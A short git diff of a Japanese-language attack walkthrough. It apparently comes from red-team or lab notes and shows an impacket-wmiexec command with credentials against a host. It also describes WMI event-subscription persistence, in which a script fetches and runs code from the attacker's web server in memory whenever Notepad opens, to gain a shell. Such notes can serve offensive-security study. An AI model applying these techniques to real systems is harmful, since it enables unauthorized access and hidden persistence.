@@ -17,7 +17,7 @@ impacket-wmiexec user:password@10.10.10.2 "whoami"
 ```
 ## Step3 永続化
 WMIのイベントサブスクリプションを悪用し、永続化を図る。  
-Filter, Consumerの作成とその2つの紐づけが必要。 Filterはいつ実行するか。Consumerは何を実行するか。 
+Filter, Consumerの作成とその2つの紐づけが必要。 Filterはいつ実行するか。Consumerは何を実行するか。  
 step3.ps1はターゲットがメモ帳を開くたびに攻撃者のWebサーバーからスクリプトをメモリ上で実行し、シェルを取る永続化の例。
 ```powershell
 # Consumer確認
